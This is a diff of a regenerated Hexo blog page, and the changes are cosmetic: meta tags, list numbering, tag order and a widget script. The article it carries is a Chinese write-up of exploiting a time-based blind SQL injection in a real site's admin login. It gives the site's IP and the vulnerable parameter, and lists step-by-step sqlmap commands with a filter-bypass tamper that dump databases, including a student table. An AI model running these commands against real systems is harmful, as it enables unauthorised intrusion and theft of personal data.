@@ -1,24 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://www.lovebear.top">
   <title>阳光兔后台时间注入--可脱库 | Blog for You</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="一、前言：翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址传送门，当时wooyun上爆出的漏洞是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。">
+<meta name="keywords" content="Vulnerability">
 <meta property="og:type" content="article">
 <meta property="og:title" content="阳光兔后台时间注入--可脱库">
 <meta property="og:url" content="http://www.lovebear.top/2018/09/19/Ygtoo_TimeInject/index.html">
 <meta property="og:site_name" content="Blog for You">
 <meta property="og:description" content="一、前言：翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址传送门，当时wooyun上爆出的漏洞是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。">
+<meta property="og:locale" content="default">
 <meta property="og:image" content="http://www.lovebear.top/img/ygtoo2.png">
 <meta property="og:image" content="http://www.lovebear.top/img/ygtoo3.png">
 <meta property="og:image" content="http://www.lovebear.top/img/ygtoo4.png">
 <meta property="og:image" content="http://www.lovebear.top/img/ygtoo1.png">
-<meta property="og:updated_time" content="2018-12-05T08:55:43.557Z">
+<meta property="og:updated_time" content="2018-12-05T08:55:43.558Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="阳光兔后台时间注入--可脱库">
 <meta name="twitter:description" content="一、前言：翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址传送门，当时wooyun上爆出的漏洞是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。">
@@ -29,12 +31,12 @@
   
     <link rel="icon" href="/favicon.png">
   
-  <link rel="stylesheet" href="/main.css?v=4.0.0.css">
+  <link rel="stylesheet" href="/main.css?v=4.0.0">
   
 
   
 
-  <meta name="360-site-verification" content="a567763f2a0832b99ea6d0a57db81fbc" />
+  <meta name="360-site-verification" content="a567763f2a0832b99ea6d0a57db81fbc">
   <script>(function(){
 var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?1bc693950a04b443481f93da0209d936":"https://jspassport.ssl.qhimg.com/11.0.1.js?1bc693950a04b443481f93da0209d936";
 document.write('<script src="' + src + '" id="sozz"><\/script>');
@@ -57,7 +59,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 
   <script src="/js/jquery.js"></script>
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -170,7 +172,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Ygtoo_TimeInject" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Ygtoo_TimeInject" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -188,7 +190,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="一、前言："><a href="#一、前言：" class="headerlink" title="一、前言："></a>一、前言：</h2><p>翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址<br><a href="http://182.92.241.143/panel/login.php" target="_blank" rel="external">传送门</a>，当时wooyun上爆出的漏洞<br>是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波<br>紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。</p>
+        <h2 id="一、前言："><a href="#一、前言：" class="headerlink" title="一、前言："></a>一、前言：</h2><p>翻wooyun关闭之前的漏洞进行学习的时候，发现阳光兔了阳光兔的后台登陆地址<br><a href="http://182.92.241.143/panel/login.php" target="_blank" rel="noopener">传送门</a>，当时wooyun上爆出的漏洞<br>是后台登陆弱口令漏洞，我偶然发现，这个后台存在sql时间盲注，就进行了一波<br>紧张刺激的脱库，写本文的时候，已经将漏洞提交，并不会用数据做恶意的事情。</p>
 <a id="more"></a>
 <h2 id="二、脱库过程："><a href="#二、脱库过程：" class="headerlink" title="二、脱库过程："></a>二、脱库过程：</h2><p>手工注入测试出了sql时间注入漏洞，好像只过滤了空格，果断拿出sqlmap进行一下<br>自动脱库。</p>
 <ol>
@@ -212,29 +214,29 @@ Cookie: hidden=value; PHPSSID=foidj69smkvieobg8q7an0qsa6
 
 user_name=hjj&amp;password=hjj&amp;loginSubmit=%E7%99%BB%E5%85%A5
 </code></pre><p>发生漏洞的参数为user_name，这里存在注入</p>
-<ol>
+<ol start="2">
 <li>使用sqlmap神器进行数据库类型猜解</li>
 </ol>
 <pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment
 </code></pre><p>得到数据库类型为Mysql<br>P.S. 这里使用了一个tamper脚本，绕过网站的空格过滤机制。</p>
-<ol>
+<ol start="3">
 <li>数据库名的猜解</li>
 </ol>
-<pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql
+<pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql  
 </code></pre><p>可以得到三个数据库名</p>
 <pre><code>information_schema
 mysql
 ygtoo
 </code></pre><p>上面两个是mysql自带的数据库，ygtoo中一定是网站的数据库（名字也能看出来）</p>
-<ol>
+<ol start="4">
 <li>数据表的猜解</li>
 </ol>
 <pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
---tables
+--tables 
 </code></pre><p>只得到了一个数据表</p>
 <pre><code>increment_trx
 </code></pre><p>虽然很奇怪为什么没有其它的，还是继续爆破内容，看看里面是什么再说吧。</p>
-<ol>
+<ol start="5">
 <li>数据表的列的猜解</li>
 </ol>
 <pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
@@ -247,13 +249,13 @@ checkpoint
 jobid
 partition
 </code></pre><p>里面居然有databse和table，看看里面数据究竟有什么</p>
-<ol>
+<ol start="6">
 <li>dump数据</li>
 </ol>
 <pre><code>python sqlmap.py -r post.txt --level=3 --tamper=space2comment --dbms mysql -D ygtoo 
 --T increment_trx -C &quot;jobid,table,partition,database,timestamp,checkpoint&quot; --dump
 </code></pre><p><img src="http://www.lovebear.top/img/ygtoo2.png" alt="hjj"><br>可以看到正在dump数据<br><img src="http://www.lovebear.top/img/ygtoo3.png" alt="hjj"><br>最后爆破出数据的结果<br><img src="http://www.lovebear.top/img/ygtoo4.png" alt="hjj"><br>我们在这个表中发现了ygtoo库中其他隐藏的表名！</p>
-<ol>
+<ol start="7">
 <li>猜解qt_student表中的列</li>
 </ol>
 <pre><code>python sqlmap.py -r post.txt --tamper=space2comment --dbms mysql -D ygtoo -T qt_student
@@ -435,14 +437,9 @@ partition
 	}
 </script>
 
-<script src="/./main.js?v=4.0.0.js"></script>
+<script src="/./main.js?v=4.0.0"></script>
 
 
-
-<div id="totop" style="position:fixed;bottom:50px;right:30px;cursor: pointer;">
-<a title="totop"><img src="/img/scrollup.png"/></a>
-</div>
-<script src="/js/totop.js"></script>
     
 <div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
   <div class="tools-wrap">
@@ -485,6 +482,22 @@ partition
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ssl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ubuntu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">翻墙</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Vulnerability</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">hexo</a>
               </li>
              
@@ -495,29 +508,13 @@ partition
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">pacman</a>
               </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">ssl</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">Vulnerability</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">ubuntu</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">翻墙</a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            缺失模块。<br>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
             2、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
@@ -662,5 +659,5 @@ partition
 
 </div>
   </div>
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":true}});</script></body>
 </html>
